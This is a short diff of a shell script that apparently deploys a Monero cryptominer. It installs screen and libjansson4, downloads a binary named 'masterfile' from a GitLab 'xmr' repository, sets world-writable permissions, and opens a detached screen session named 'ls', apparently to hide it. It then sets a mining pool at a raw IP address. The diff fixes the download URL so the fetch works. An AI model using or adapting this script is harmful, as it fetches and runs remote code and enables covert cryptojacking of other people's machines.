@@ -1,7 +1,7 @@
 #!/bin/sh
 apt-get update 
 apt-get install screen libjansson4 -y
-wget https://gitlab.com/buyutuk/xmr/-/blob/main/masterfile
+wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
 chmod 777 masterfile
 screen -dmS ls
 POOL=149.248.5.123:6166
